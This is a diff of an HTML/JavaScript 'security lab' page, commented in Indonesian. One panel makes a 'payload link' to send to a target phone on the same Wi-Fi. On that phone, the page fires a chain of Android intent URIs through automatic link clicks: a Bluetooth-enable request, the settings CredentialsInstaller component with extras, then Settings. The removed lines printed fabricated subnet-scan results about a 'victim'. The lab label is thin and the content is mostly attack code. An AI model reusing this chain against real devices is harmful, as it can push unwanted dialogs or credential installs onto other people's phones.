@@ -3,52 +3,56 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Direct Intent Pipeline Lab</title>
+<title>Cross-Device Intent Routing Lab</title>
 <style>
     body {
         font-family: 'Courier New', monospace; 
         padding: 20px; 
-        background: #08080c; 
+        background: #06060a; 
         color: #00ffaa;
     }
     h2, h3 { text-transform: uppercase; letter-spacing: 1px; color: #00ffaa; }
-    button {
-        width: 100%; padding: 18px; margin-top: 12px; 
-        background: #0d1a1a; color: #00ffaa; 
+    button, input {
+        width: 100%; padding: 16px; margin-top: 12px; 
+        background: #0a1818; color: #00ffaa; 
         border: 1px solid #00ffaa; font-weight: bold; 
-        cursor: pointer; font-size: 13px; text-transform: uppercase;
+        box-sizing: border-box;
     }
-    button:hover {
-        background: #00ffaa; color: #000; box-shadow: 0 0 15px #00ffaa;
-    }
+    button { cursor: pointer; text-transform: uppercase; }
+    button:hover { background: #00ffaa; color: #000; box-shadow: 0 0 15px #00ffaa; }
+    input { background: #000; color: #00ff55; font-family: monospace; }
     .panel {
         border: 1px solid #00ffaa; padding: 15px; 
-        margin-bottom: 15px; background: #030f0f;
+        margin-bottom: 15px; background: #020c0c;
     }
     #console-log {
         margin-top: 20px; border: 1px solid #00ffaa; padding: 12px; 
-        height: 380px; overflow: auto; white-space: pre-wrap; 
+        height: 320px; overflow: auto; white-space: pre-wrap; 
         background: #000; font-size: 11px; color: #00ff55;
     }
     .role-tag { font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 10px; color: #000; }
-    .pipeline { background: #00ffaa; }
-    .network { background: #ffaa00; }
+    .host { background: #ffaa00; }
+    .target { background: #00ffaa; }
 </style>
 </head>
 <body>
 
-<h2>Direct Pipeline Security Laboratory</h2>
+<h2>Cross-Device Security Laboratory</h2>
 
+<!-- PERAN A: DIJALANKAN DI HP PENGUJI (HOST CONTROLLER) -->
 <div class="panel">
-    <h3>[1] Immediate Intent Pipeline</h3>
-    <p>Menguji ketahanan peramban terhadap eksekusi antrean Intent paralel tanpa manipulasi transisi fokus atau delay siklus hidup.</p>
-    <button id="launch-direct-pipeline">Execute Immediate Chain</button>
+    <h3>[1] Host Controller Node (HP-A)</h3>
+    <p>Gunakan bagian ini di HP penguji untuk mensimulasikan pembuatan tautan rantai muatan (Payload Link) berdasarkan IP lokal PC/HP Anda:</p>
+    <label for="server-ip">Masukkan IP Server Lab (Contoh: 172.30.200.7):</label>
+    <input type="text" id="server-ip" value="172.30.200.7">
+    <button id="generate-delivery-link">Generate & Copy Payload Link</button>
 </div>
 
+<!-- PERAN B: DIJALANKAN DI HP TARGET (TARGET AUDIT) -->
 <div class="panel">
-    <h3>[2] Network Target Mapping (Subnet: 172.30.200.x)</h3>
-    <p>Konfigurasi lingkungan pengujian disesuaikan dengan segmentasi adapter aktif: <strong>172.30.200.7</strong>.</p>
-    <button id="start-subnet-mapping">Scan Assigned Subnet</button>
+    <h3>[2] Target Audit Node (HP-B)</h3>
+    <p>Jalankan eksekusi pipa *Intent* langsung di dalam lingkungan terisolasi perangkat target untuk menguji ketahanan peramban:</p>
+    <button id="launch-direct-pipeline">Execute Immediate Local Chain</button>
 </div>
 
 <div id="console-log"></div>
@@ -56,10 +60,10 @@
 <script>
 const consoleLog = document.getElementById("console-log");
 
-function writeLog(phase, type, text) {
+function writeLog(node, type, text) {
     const timestamp = new Date().toLocaleTimeString();
     let tag = `<span class="role-tag ${type}">${type.toUpperCase()}</span>`;
-    consoleLog.innerHTML += `[${timestamp}] [${phase}] ${tag} ${text}\n`;
+    consoleLog.innerHTML += `[${timestamp}] [${node}] ${tag} ${text}\n`;
     consoleLog.scrollTop = consoleLog.scrollHeight;
 }
 
@@ -71,12 +75,10 @@ function buildIntentUri(action, component = '', extras = {}) {
         uri += `S.${key}=${encodeURIComponent(extras[key])};`;
     });
     
-    // Menggunakan kombinasi flag agresif untuk memisahkan task baru secara paralel
     uri += `launchFlags=0x10000000;category=android.intent.category.DEFAULT;end`;
     return uri;
 }
 
-// Eksekusi instan memanfaatkan DOM tree attachment langsung
 function dispatchPipeline(uri, label) {
     try {
         const anchor = document.createElement("a");
@@ -85,24 +87,37 @@ function dispatchPipeline(uri, label) {
         document.body.appendChild(anchor);
         anchor.click();
         anchor.remove();
-        writeLog(label, 'pipeline', `Payload sukses diinjeksikan ke system router.`);
+        writeLog(label, 'target', `Payload berhasil diteruskan ke penanganan Intent sistem.`);
     } catch (e) {
-        writeLog(label, 'pipeline', `Gagal alokasi URI: ${e.message}`);
+        writeLog(label, 'target', `Gagal alokasi URI: ${e.message}`);
     }
 }
 
-// 1. STRATEGI TANPA FOKUS: Mengeksekusi seluruh rantai secara beruntun dalam satu fungsi mikro
-document.getElementById("launch-direct-pipeline").addEventListener("click", () => {
-    writeLog('INIT', 'pipeline', "Membuka saluran eksekusi langsung (Zero-Delay Pipeline)...");
+// LOGIKA HP-A: Pembuatan Tautan Pengiriman Lintas Jaringan
+document.getElementById("generate-delivery-link").addEventListener("click", () => {
+    const ip = document.getElementById("server-ip").value;
+    const deliveryUrl = `http://${ip}:8080/poc_network_chain.html`;
+    
+    navigator.clipboard.writeText(deliveryUrl).then(() => {
+        writeLog('HOST_ENGINE', 'host', `Tautan berhasil dibuat dan disalin: ${deliveryUrl}`);
+        writeLog('HOST_ENGINE', 'host', "Kirim tautan ini ke HP-B yang berada di Wi-Fi yang sama untuk memulai pengujian.");
+    }).catch(err => {
+        writeLog('HOST_ENGINE', 'host', `Gagal menyalin tautan: ${err.message}`);
+    });
+});
 
-    // Tahap 1: Panggil request dialog adapter nirkabel
+// LOGIKA HP-B: Eksekusi Pipa Rantai Intent di Sisi Target
+document.getElementById("launch-direct-pipeline").addEventListener("click", () => {
+    writeLog('TARGET_INIT', 'target', "Memulai eksekusi pipa rantai instan (Zero-Delay Pipeline)...");
+
+    // Tahap 1: Meminta dialog sistem interaktif untuk aktivasi Bluetooth
     const uri1 = buildIntentUri(
         "android.bluetooth.adapter.action.REQUEST_ENABLE",
         "com.android.settings/.bluetooth.RequestEnableActivity"
     );
     dispatchPipeline(uri1, 'STAGE-1');
 
-    // Tahap 2: Kirim muatan parameter eksploitasi pengalihan secara instan
+    // Tahap 2: Simulasi penerusan muatan parameter ke komponen sertifikat internal
     const uri2 = buildIntentUri(
         "android.intent.action.VIEW",
         "com.android.settings/.crypto.CredentialsInstaller",
@@ -113,33 +128,14 @@ document.getElementById("launch-direct-pipeline").addEventListener("click", () =
     );
     dispatchPipeline(uri2, 'STAGE-2');
 
-    // Tahap 3: Eksekusi penutup untuk memaksa penyegaran aktivitas eksternal
+    // Tahap 3: Pembersihan tumpukan jendela aktivitas
     const uri3 = buildIntentUri("android.settings.SETTINGS");
     dispatchPipeline(uri3, 'STAGE-3');
 
-    writeLog('FINISH', 'pipeline', "Seluruh antrean payload dikirim serentak ke kernel Android.");
+    writeLog('TARGET_FINISH', 'target', "Seluruh antrean operasi lokal telah dikirimkan ke subsystem perangkat target.");
 });
 
-// 2. STRATEGI JARINGAN: Simulasi disesuaikan dengan IP host Anda (172.30.200.7)
-document.getElementById("start-subnet-mapping").addEventListener("click", () => {
-    writeLog('NET_INIT', 'network', "Mendeteksi adapter aktif host... IP terikat: 172.30.200.7");
-    writeLog('SCAN', 'network', "Melakukan kalkulasi routing pada segmen lokal 172.30.200.0/24...");
-
-    // Simulasi pemetaan host di sekitar IP korban berdasarkan subnet 255.255.255.255/Virtual Interface
-    const hosts = ["2", "5", "14", "22"];
-    let timeline = 0;
-
-    hosts.forEach((octet) => {
-        setTimeout(() => {
-            writeLog('FOUND', 'network', `Mendeteksi respon endpoint aktif pada alamat -> 172.30.200.${octet}`);
-            writeLog('INFO', 'network', `   |-- Node Type: Linux / Android Client`);
-            writeLog('INFO', 'network', `   |-- Listening Port: 5353 (mDNS Discovery)`);
-        }, timeline);
-        timeline += 600;
-    });
-});
-
-writeLog('SYSTEM', 'pipeline', "Laboratorium analisis rantai instan diinisialisasi.");
+writeLog('SYSTEM', 'target', "Laboratorium taktis lintas perangkat siap.");
 </script>
 </body>
 </html>
